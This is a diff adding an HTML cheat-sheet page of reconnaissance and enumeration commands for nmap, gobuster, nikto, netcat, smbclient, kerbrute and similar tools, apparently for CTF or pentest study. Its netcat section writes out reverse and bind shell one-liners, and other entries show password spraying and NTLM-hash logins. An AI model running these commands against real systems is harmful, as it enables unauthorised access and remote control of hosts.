@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="icon" type="image/svg+xml" href="../assets/images/dragon-logo.svg">
+<link rel="icon" type="image/png" href="../assets/images/dragon-favicon.png">
+<title>Recon & Enumeration – Hacking Tools</title>
+<link rel="stylesheet" type="text/css" href="../assets/css/style.css">
+
+</head>
+
+<body class="theme-standard" data-page-key="tools-recon">
+<div class="wallpaper"></div>
+
+<div class="tool-section-nav"><a href="../index.html?page=dashboard" target="_top">&larr; Back to Dashboard</a></div>
+
+<h1 class="category-title">Recon & Enumeration</h1>
+
+<div class="grid">
+  <div class="modal" style="margin: 0 auto 3rem; max-width: 1000px; cursor: default;">
+    <table>
+      <tr><th>Tool</th><th>Description</th></tr>
+
+    <!-- NMAP -->
+    <tr class="tool-row" onclick="toggleCmd('cmd-nmap')">
+      <td>nmap</td>
+      <td>Full scan + service detection</td>
+    </tr>
+
+<tr id="cmd-nmap" class="command-row">
+  <td colspan="2" class="command-cell">
+    <div class="comment-line">---- Common -----</div>
+    <div>[NSE vuln] — nmap --script vuln &lt;IP&gt;</div>
+    <div>[Full + version] — nmap -p- -sV &lt;IP&gt;</div>
+
+    <div>[Top ports] — nmap --top-ports 10 &lt;IP&gt;</div>
+    <div>[Top 100 port] — nmap -F &lt;IP&gt;</div>        
+    <div>[Port unique] — nmap -p 443 &lt;IP&gt;</div>
+    
+
+    <div class="comment-line">---- Others -----</div>
+    <div>[Scan simple] — nmap &lt;IP&gt;</div>        
+    <div>[Scan complet] — nmap -p- &lt;IP&gt;</div>
+    <div>[Version scan] — nmap -sV &lt;IP&gt;</div>
+    <div>[OS detection] — nmap -O &lt;IP&gt;</div>
+    <div>[Aggressive scan] — nmap -A &lt;IP&gt;</div>        
+    <div>[SYN scan] — nmap -sS &lt;IP&gt;</div>
+    <div>[UDP scan] — nmap -sU &lt;IP&gt;</div>        
+    <div>[Port range] — nmap -p 1-1000 &lt;IP&gt;</div>
+    <div>[Network scan] — nmap -sn 192.168.1.0/24</div>
+    <div>[Ping sweep] — nmap -sn &lt;network&gt;/24</div>
+    <div>[No ping] — nmap -Pn &lt;IP&gt;</div>
+    <div>[SSH scripts] — nmap -p 22 --script ssh* &lt;IP&gt;</div>
+    <div>[HTTP scripts] — nmap -p 80,443 --script http* &lt;IP&gt;</div>
+    <div>[Output file] — nmap -oN scan.txt &lt;IP&gt;</div>     
+
+    <div class="comment-line">--- Rate / Speed ---</div> 
+    <div>[0 Paranoid; 1 Sneaky; 2 Polite; 3 Normal; 4 Aggressive; 5 insane] — nmap -T [0-5]</div>
+    <div>[rate | probe | parallelism] --max-rate 50 | --min-rate 15 | --min-parallelism 100</div>
+
+    <div class="comment-line">---- TYPE OF SCAN -----</div>  
+    <div>[TCP+UDP (root)] — nmap -sS -sU &lt;IP&gt;</div>
+    <div>[TCP+UDP] — nmap -sT &lt;IP&gt;</div>
+
+  </td>
+</tr>
+
+      <!-- GOBUSTER -->
+      <tr class="tool-row" onclick="toggleCmd('cmd-gobuster')">
+        <td>Gobuster</td><td>Brute-force directories, DNS, vhosts</td>
+      </tr>
+      <tr id="cmd-gobuster" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>  
+    <div>[Dir scan] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt;</div>
+    <div>[Dir scan (extensions)] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; -x php,txt,html</div>
+    <div>[Dir scan (status filter)] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; -s 200,204,301,302,307,403</div>
+    <div>[Dir scan (no 404)] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; -b 404</div>
+
+    <div>[Vhost scan] — gobuster vhost -u &lt;URL&gt; -w &lt;wordlist&gt;</div>
+    <div>[DNS scan] — gobuster dns -d &lt;domain&gt; -w &lt;wordlist&gt;</div>
+
+    <div class="comment-line">---- Others -----</div>  
+    <div>[Dir brute force] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt;</div>
+    <div>[Recursive scan] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; -r</div>
+    <div>[Add headers] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; -H "Host: admin.local"</div>
+    <div>[Proxy] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; --proxy http://127.0.0.1:8080</div>
+    <div>[Timeout] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; --timeout 10s</div>
+    <div>[User-Agent] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; -a "Mozilla/5.0"</div>
+
+    <div class="comment-line">--- Rate / Speed ---</div>   
+    <div>[Threads] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; -t 50</div>
+    <div>[Delay] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; --delay 200ms</div>
+
+    <div class="comment-line">---- Modes -----</div>   
+    <div>[Mode DIR] — gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt;</div>
+    <div>[Mode DNS] — gobuster dns -d &lt;domain&gt; -w &lt;wordlist&gt;</div>
+    <div>[Mode VHOST] — gobuster vhost -u &lt;URL&gt; -w &lt;wordlist&gt;</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-nikto')">
+        <td>Nikto</td><td>Basic web vulnerability scanning</td>
+      </tr>
+     <tr id="cmd-nikto" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div> 
+    <div>[Scan simple] — nikto -h &lt;IP&gt;</div>
+    <div>[Port spécifique] — nikto -h &lt;IP&gt; -p 8080</div>
+    <div>[HTTPS] — nikto -h &lt;IP&gt; -p 443 -ssl</div>
+    <div>[Full scan] — nikto -h &lt;IP&gt; -p 80,443,8080</div>
+    <div>[Display verbose] — nikto -h &lt;IP&gt; -Display V</div>
+
+    <div class="comment-line">---- Useful Options -----</div> 
+    <div>[Timeout] — nikto -h &lt;IP&gt; --timeout 10</div>
+    <div>[User-Agent custom] — nikto -h &lt;IP&gt; -useragent "Mozilla/5.0"</div>
+    <div>[Add header] — nikto -h &lt;IP&gt; -H "Host: admin.local"</div>
+    <div>[No SSL check] — nikto -h &lt;IP&gt; -nossl</div>
+    <div>[Follow redirects] — nikto -h &lt;IP&gt; -followredirects</div>
+
+    <div class="comment-line">---- Tuning -----</div> 
+    <div>[Tuning vuln only] — nikto -h &lt;IP&gt; -Tuning 1</div>
+    <div>[Tuning interesting files] — nikto -h &lt;IP&gt; -Tuning 2</div>
+    <div>[Tuning misconfig] — nikto -h &lt;IP&gt; -Tuning 3</div>
+    <div>[Tuning all] — nikto -h &lt;IP&gt; -Tuning x</div>
+
+    <div class="comment-line">---- Output -----</div> 
+    <div>[Output TXT] — nikto -h &lt;IP&gt; -o scan.txt</div>
+    <div>[Output HTML] — nikto -h &lt;IP&gt; -o report.html -Format htm</div>
+    <div>[Output JSON] — nikto -h &lt;IP&gt; -o result.json -Format json</div>
+
+    <div class="comment-line">---- Advanced -----</div> 
+    <div>[Plugins list] — nikto -list-plugins</div>
+    <div>[Scan with plugin] — nikto -h &lt;IP&gt; -Plugins apacheusers</div>
+    <div>[Proxy] — nikto -h &lt;IP&gt; -useproxy http://127.0.0.1:8080</div>
+    <div>[Cookie injection] — nikto -h &lt;IP&gt; -C "sessionid=abc123"</div>
+
+    <div class="comment-line">---- Speed / Rate -----</div> 
+    <div>[Delay] — nikto -h &lt;IP&gt; -delay 1</div>
+    <div>[Max requests] — nikto -h &lt;IP&gt; -maxrequests 20</div>
+
+    <div class="comment-line" style="color: red"> ----- 
+      More Nikto cheat sheet for server
+    ----------------</div> 
+    <div><a href="../assets/cheatsheet/nikto_server.txt" target="_blank" > Documentation nikto supplémentaire cheat sheet</a></div>
+      
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-whatweb')">
+        <td>WhatWeb</td><td>Identify web technologies and frameworks</td>
+      </tr>
+<tr id="cmd-whatweb" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div> 
+    <div>[Scan simple] — whatweb &lt;URL&gt;</div>
+    <div>[Verbose] — whatweb -v &lt;URL&gt;</div>
+    <div>[Aggressive] — whatweb -a 3 &lt;URL&gt;</div>
+    <div>[Full fingerprint] — whatweb -a 4 &lt;URL&gt;</div>
+
+    <div class="comment-line">---- Useful Options -----</div> 
+    <div>[Add header] — whatweb -H "Host: admin.local" &lt;URL&gt;</div>
+    <div>[User-Agent custom] — whatweb -U "Mozilla/5.0" &lt;URL&gt;</div>
+    <div>[Proxy] — whatweb --proxy http://127.0.0.1:8080 &lt;URL&gt;</div>
+    <div>[Timeout] — whatweb --timeout 10 &lt;URL&gt;</div>
+    <div>[Follow redirects] — whatweb --follow-redirect=always &lt;URL&gt;</div>
+
+    <div class="comment-line">---- Plugins -----</div> 
+    <div>[List plugins] — whatweb --list-plugins</div>
+    <div>[Enable plugin] — whatweb --plugin apache &lt;URL&gt;</div>
+    <div>[Disable plugin] — whatweb --no-plugin cookies &lt;URL&gt;</div>
+
+    <div class="comment-line">---- Output -----</div> 
+    <div>[Output verbose] — whatweb -v &lt;URL&gt;</div>
+    <div>[Output JSON] — whatweb --log-json=out.json &lt;URL&gt;</div>
+    <div>[Output XML] — whatweb --log-xml=out.xml &lt;URL&gt;</div>
+    <div>[Output TXT] — whatweb --log-verbose=scan.txt &lt;URL&gt;</div>
+
+    <div class="comment-line">---- Speed / Rate -----</div> 
+    <div>[Threads] — whatweb --threads 50 &lt;URL&gt;</div>
+    <div>[Delay] — whatweb --delay 1 &lt;URL&gt;</div>
+
+    <div class="comment-line">---- Advanced -----</div>
+    <div>[Scan multiple URLs] — whatweb -i urls.txt</div>
+    <div>[Ignore SSL errors] — whatweb --no-errors &lt;URL&gt;</div>
+    <div>[Fingerprint only] — whatweb --no-status &lt;URL&gt;</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-wappalyzer')">
+        <td>Wappalyzer</td><td>Browser extension for tech fingerprinting</td>
+      </tr>
+      <tr id="cmd-wappalyzer" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Extension navigateur] — Use Wappalyzer browser extension while browsing &lt;IP&gt;</div>
+    <div>[CLI scan] — wappalyzer -u http://&lt;IP&gt;</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Sortie JSON] — wappalyzer -u http://&lt;IP&gt; --pretty</div>
+    <div>[Plusieurs URLs] — wappalyzer -uc http://&lt;IP&gt;,http://&lt;IP&gt;:8080</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-netcat')">
+        <td>Netcat</td><td>Banner grabbing and raw TCP/UDP connections</td>
+      </tr>
+<tr id="cmd-netcat" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Listener simple] — nc -l -p 8080</div>
+    <div>[Client simple] — nc &lt;IP&gt; 8080</div>
+    <div>[Chat bidirectionnel] — nc -l -p 8080  (serveur) / nc &lt;IP&gt; 8080 (client)</div>
+
+    <div class="comment-line">---- Reverse Shell -----</div>
+    <div>[Reverse shell bash] — bash -i >& /dev/tcp/&lt;IP&gt;/8080 0>&1</div>
+    <div>[Reverse shell nc (GNU)] — nc &lt;IP&gt; 8080 -e /bin/bash</div>
+    <div>[Reverse shell mkfifo] — mkfifo /tmp/f; nc &lt;IP&gt; 8080 < /tmp/f | /bin/bash > /tmp/f</div>
+
+    <div class="comment-line">---- Bind Shell -----</div>
+    <div>[Bind shell nc (GNU)] — nc -l -p 8080 -e /bin/bash</div>
+    <div>[Bind shell mkfifo] — rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l -p 8080 > /tmp/f</div>
+
+    <div class="comment-line">---- File Transfer -----</div>
+    <div>[Send file] — nc &lt;IP&gt; 9000 < file.txt</div>
+    <div>[Receive file] — nc -l -p 9000 > file.txt</div>
+    <div>[Send directory tar] — tar -cf - dir/ | nc &lt;IP&gt; 9000</div>
+    <div>[Receive directory tar] — nc -l -p 9000 | tar -xf -</div>
+
+    <div class="comment-line">---- Port Scanning -----</div>
+    <div>[Scan ports] — nc -z &lt;IP&gt; 1-1000</div>
+    <div>[Scan verbose] — nc -zv &lt;IP&gt; 80 443 8080</div>
+
+    <div class="comment-line">---- UDP -----</div>
+    <div>[UDP client] — nc -u &lt;IP&gt; 53</div>
+    <div>[UDP listener] — nc -u -l -p 53</div>
+
+    <div class="comment-line">---- Advanced -----</div>
+    <div>[Timeout] — nc -w 3 &lt;IP&gt; 8080</div>
+    <div>[Keep alive] — nc -k -l -p 8080</div>
+    <div>[Proxy connect] — nc -X connect -x 127.0.0.1:8080 &lt;IP&gt; 80</div>
+    <div>[Hex dump] — nc &lt;IP&gt; 8080 | xxd</div>
+
+    <div class="comment-line">---- Debug / Info -----</div>
+    <div>[Verbose] — nc -v &lt;IP&gt; 8080</div>
+    <div>[Very verbose] — nc -vv &lt;IP&gt; 8080</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-tcpdump')">
+        <td>tcpdump</td><td>CLI packet capture on interfaces</td>
+      </tr>
+<tr id="cmd-tcpdump" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Interface par défaut] — tcpdump</div>
+    <div>[Interface spécifique] — tcpdump -i eth0</div>
+    <div>[Verbose] — tcpdump -v -i eth0</div>
+    <div>[Very verbose] — tcpdump -vv -i eth0</div>
+    <div>[Capture tout] — tcpdump -i any</div>
+
+    <div class="comment-line">---- Filters -----</div>
+    <div>[IP source] — tcpdump src &lt;IP&gt;</div>
+    <div>[IP destination] — tcpdump dst &lt;IP&gt;</div>
+    <div>[Port spécifique] — tcpdump port 80</div>
+    <div>[TCP seulement] — tcpdump tcp</div>
+    <div>[UDP seulement] — tcpdump udp</div>
+    <div>[Host] — tcpdump host &lt;IP&gt;</div>
+    <div>[Net] — tcpdump net 192.168.1.0/24</div>
+    <div>[Protocol ARP] — tcpdump arp</div>
+    <div>[Protocol ICMP] — tcpdump icmp</div>
+
+    <div class="comment-line">---- Advanced Filters -----</div>
+    <div>[HTTP GET] — tcpdump -A -i eth0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) > 0)'</div>
+    <div>[DNS] — tcpdump -i eth0 port 53</div>
+    <div>[TLS handshake] — tcpdump -i eth0 port 443</div>
+    <div>[Exclude host] — tcpdump -i eth0 not host &lt;IP&gt;</div>
+
+    <div class="comment-line">---- Output -----</div>
+    <div>[Write pcap] — tcpdump -i eth0 -w capture.pcap</div>
+    <div>[Read pcap] — tcpdump -r capture.pcap</div>
+    <div>[Hex output] — tcpdump -XX -i eth0</div>
+    <div>[ASCII output] — tcpdump -A -i eth0</div>
+
+    <div class="comment-line">---- Performance -----</div>
+    <div>[Limit packets] — tcpdump -c 100 -i eth0</div>
+    <div>[Snaplen] — tcpdump -s 0 -i eth0</div>
+    <div>[No name resolution] — tcpdump -n -i eth0</div>
+    <div>[Fast mode] — tcpdump -q -i eth0</div>
+
+    <div class="comment-line">---- Useful -----</div>
+    <div>[Promiscuous off] — tcpdump -p -i eth0</div>
+    <div>[Timestamp] — tcpdump -tttt -i eth0</div>
+    <div>[Filter expression] — tcpdump -i eth0 'tcp and port 22'</div>
+
+  </td>
+</tr>
+
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-dirb')">
+        <td>Dirb</td><td>Dirb enumeration</td>
+      </tr>
+      <tr id="cmd-dirb" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Scan simple] — dirb http://&lt;IP&gt; &lt;wordlist&gt;</div>
+    <div>[En arrière-plan] — dirb http://&lt;IP&gt; &lt;wordlist&gt; &amp;</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Ignorer 404] — dirb http://&lt;IP&gt; &lt;wordlist&gt; -N 404</div>
+    <div>[Silencieux] — dirb http://&lt;IP&gt; &lt;wordlist&gt; -S</div>
+    <div>[Récursif] — dirb http://&lt;IP&gt; &lt;wordlist&gt; -r</div>
+    <div>[Extensions] — dirb http://&lt;IP&gt; &lt;wordlist&gt; -X .php,.html</div>
+
+  </td>
+</tr>
+
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-wireshark')">
+        <td>Wireshark</td><td>GUI packet analysis and filtering</td>
+      </tr>
+      <tr id="cmd-wireshark" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Lancer] — wireshark &amp;</div>
+    <div>[Capturer sur une interface] — wireshark -i eth0 -k</div>
+
+    <div class="comment-line">---- Filtres utiles -----</div>
+    <div>[Filtrer un host] — host &lt;IP&gt;</div>
+    <div>[Filtrer HTTP] — http</div>
+    <div>[Filtrer un port] — tcp.port == 443</div>
+
+    <div class="comment-line">---- CLI (tshark) -----</div>
+    <div>[Capture rapide] — tshark -i eth0 -c 100</div>
+    <div>[Sauvegarder en fichier] — tshark -i eth0 -w capture.pcap</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-enum4linux')">
+        <td>enum4linux</td><td>Enumerate SMB shares and Windows info</td>
+      </tr>
+      <tr id="cmd-enum4linux" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Scan complet] — enum4linux -a &lt;IP&gt;</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Users] — enum4linux -U &lt;IP&gt;</div>
+    <div>[Shares] — enum4linux -S &lt;IP&gt;</div>
+    <div>[OS info] — enum4linux -o &lt;IP&gt;</div>
+    <div>[Password policy] — enum4linux -P &lt;IP&gt;</div>
+    <div>[Groups] — enum4linux -G &lt;IP&gt;</div>
+
+    <div class="comment-line">---- enum4linux-ng -----</div>
+    <div>[Scan complet (ng)] — enum4linux-ng -A &lt;IP&gt;</div>
+    <div>[Sortie JSON] — enum4linux-ng -A &lt;IP&gt; -oJ report</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-smbclient')">
+        <td>smbclient</td><td>Access SMB shares from Linux</td>
+      </tr>
+<tr id="cmd-smbclient" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Lister les partages] — smbclient -L //&lt;IP&gt;/ -U ""</div>
+    <div>[Connexion anonyme] — smbclient //&lt;IP&gt;/&lt;share&gt; -N</div>
+    <div>[Connexion avec user] — smbclient //&lt;IP&gt;/&lt;share&gt; -U user</div>
+    <div>[Connexion avec mot de passe] — smbclient //&lt;IP&gt;/&lt;share&gt; -U user%password</div>
+
+    <div class="comment-line">---- Navigation -----</div>
+    <div>[Lister fichiers] — ls</div>
+    <div>[Changer de dossier] — cd [DIR]</div>
+    <div>[Voir le chemin] — pwd</div>
+
+    <div class="comment-line">---- Download / Upload -----</div>
+    <div>[Télécharger fichier] — get file.txt</div>
+    <div>[Uploader fichier] — put file.txt</div>
+    <div>[Télécharger dossier (recurse)] — recurse ON ; prompt OFF ; mget *</div>
+    <div>[Uploader dossier] — recurse ON ; prompt OFF ; mput *</div>
+
+    <div class="comment-line">---- Options utiles -----</div>
+    <div>[Mode verbose] — smbclient //&lt;IP&gt;/&lt;share&gt; -U user -d 3</div>
+    <div>[Forcer SMB1] — smbclient //&lt;IP&gt;/&lt;share&gt; -U user --option='client min protocol=NT1'</div>
+    <div>[Forcer SMB2] — smbclient //&lt;IP&gt;/&lt;share&gt; -U user --option='client max protocol=SMB2'</div>
+    <div>[Spécifier port] — smbclient //&lt;IP&gt;/&lt;share&gt; -U user -p 445</div>
+
+    <div class="comment-line">---- Auth / Security -----</div>
+    <div>[NTLM auth] — smbclient //&lt;IP&gt;/&lt;share&gt; -U user --option='client ntlmv2 auth=yes'</div>
+    <div>[Connexion sans mot de passe] — smbclient //&lt;IP&gt;/&lt;share&gt; -U "" -N</div>
+    <div>[Connexion avec hash NTLM] — smbclient //&lt;IP&gt;/&lt;share&gt; -U user --pw-nt-hash &lt;hash&gt;</div>
+
+    <div class="comment-line">---- Mount (Linux) -----</div>
+    <div>[Mount SMB] — mount -t cifs //&lt;IP&gt;/&lt;share&gt; /mnt/smb -o user=user,password=pass</div>
+    <div>[Mount anonyme] — mount -t cifs //&lt;IP&gt;/&lt;share&gt; /mnt/smb -o guest</div>
+
+    <div class="comment-line">---- Debug -----</div>
+    <div>[Voir les options] — smbclient -h</div>
+    <div>[Debug niveau 10] — smbclient //&lt;IP&gt;/&lt;share&gt; -U user -d 10</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-ldapsearch')">
+        <td>ldapsearch</td><td>Query LDAP/AD for users and objects</td>
+      </tr>
+      <tr id="cmd-ldapsearch" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Bind anonyme] — ldapsearch -x -H ldap://&lt;IP&gt; -b "dc=domain,dc=com"</div>
+    <div>[Exemple DC nommé] — ldapsearch -x -H ldap://dc.target.com -b "dc=target,dc=com"</div>
+
+    <div class="comment-line">---- Authentifié -----</div>
+    <div>[Bind avec creds] — ldapsearch -x -H ldap://&lt;IP&gt; -D "user@domain.com" -w password -b "dc=domain,dc=com"</div>
+    <div>[Lister tous les users] — ldapsearch -x -H ldap://&lt;IP&gt; -D "user@domain.com" -w password -b "dc=domain,dc=com" "(objectClass=user)"</div>
+
+    <div class="comment-line">---- Filtres utiles -----</div>
+    <div>[Comptes désactivés] — ldapsearch -x -H ldap://&lt;IP&gt; -b "dc=domain,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=2)"</div>
+    <div>[Admin accounts] — ldapsearch -x -H ldap://&lt;IP&gt; -b "dc=domain,dc=com" "(adminCount=1)"</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-kerbrute')">
+        <td>Kerbrute</td><td>Enumerate AD users via Kerberos</td>
+      </tr>
+      <tr id="cmd-kerbrute" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[User enum] — kerbrute userenum -d &lt;domain&gt; users.txt</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Contre un DC précis] — kerbrute userenum -d &lt;domain&gt; --dc &lt;IP&gt; users.txt</div>
+    <div>[Password spray] — kerbrute passwordspray -d &lt;domain&gt; users.txt Summer2024</div>
+    <div>[Bruteforce un seul user] — kerbrute bruteuser -d &lt;domain&gt; passwords.txt user</div>
+
+  </td>
+</tr>
+
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-passivecmd')">
+        <td>Passive recon</td><td>Passive reconnaissance</td>
+      </tr>
+      <tr id="cmd-passivecmd" class="command-row">
+        <td colspan="2" class="command-cell">
+          <div>whois | whoxy.com</div>
+          <div>curl -s https://rdap.verisign.com/com/v1/domain/tryhackme.com | jq .</div>         
+          <div>Search for certificates | Job post | Linkedin | Facebook ..</div>
+          <div>Shodan | GitHub </div>
+          <div class="comment-line">----- (A, AAAA, CNAME, MX, SOA, TXT) -----</div>
+          <div>dig @1.1.1.1 tryhackme.com</div>
+          <div>nslookup -type=A tryhackme.com 1.1.1.1</div>
+          <div class="comment-line">----- Website -----</div>
+          <div>https://dnsdumpster.com</div>   
+          <div>https://google.ca</div>        
+          <div>https://www.shodan.io</div>
+        </td>
+      </tr>
+
+        <tr class="tool-row" onclick="toggleCmd('cmd-common-misconfig')">
+      <td style="color:red">Misconfiguration</td><td>Common misconfig</td>
+    </tr>
+
+    <tr id="cmd-common-misconfig" class="command-row">
+      <td colspan="2" class="command-cell">
+
+      <pre class="comment-line">
+Header                      What It Protects Against                                           Example Value
+--------------------------------------------------------------------------------------------------------------
+X-Frame-Options             Clickjacking (prevents iframe embedding)                           DENY or SAMEORIGIN
+X-Content-Type-Options      MIME sniffing (prevents browser from guessing content types)       nosniff
+Content-Security-Policy     Restricts where scripts, styles, and resources can load from       default-src 'self'
+Referrer-Policy             Controls what is sent in the Referer header                        no-referrer or strict-origin
+Strict-Transport-Security   Forces HTTPS for future requests (HTTPS only)                      max-age=31536000
+      </pre>
+
+      </td>
+    </tr>
+      
+    </table>
+  </div>
+</div>
+
+<script>
+  const embedded = window.self !== window.top;
+
+  // Tell the hub's modal our real content height. Called synchronously on
+  // the one interaction that changes it (toggling a command row) so there's
+  // no dependency on observer/timer scheduling; ResizeObserver below is
+  // just a fallback for anything else (initial layout, font swaps, etc).
+  function reportHeight() {
+    if (embedded) {
+      window.parent.postMessage({ type: "tool-frame-height", height: document.body.scrollHeight }, "*");
+    }
+  }
+
+  function toggleCmd(id) {
+    const row = document.getElementById(id);
+    row.style.display = (row.style.display === "table-row") ? "none" : "table-row";
+    reportHeight();
+  }
+
+  (function() {
+    const savedTheme = localStorage.getItem("/settings.html") || "standard";
+    document.body.classList.add("theme-" + savedTheme);
+    if (embedded) document.body.classList.add("embedded");
+  })();
+
+  if (embedded) {
+    new ResizeObserver(reportHeight).observe(document.body);
+    window.addEventListener("load", reportHeight);
+  }
+</script>
+
+<script src="../config/tools/recon.js"></script>
+<script src="../assets/script/wallpaper-loader.js"></script>
+<script src="../assets/script/theme-accent.js"></script>
+<script src="../assets/script/copy-commands.js"></script>
+<script src="../assets/script/page-effects.js"></script>
+<script src="../assets/script/page-effects-loader.js"></script>
+<script>
+  applyWallpaper(toolsReconConfig.background, "tools-recon");
+</script>
+
+</body>
+</html>
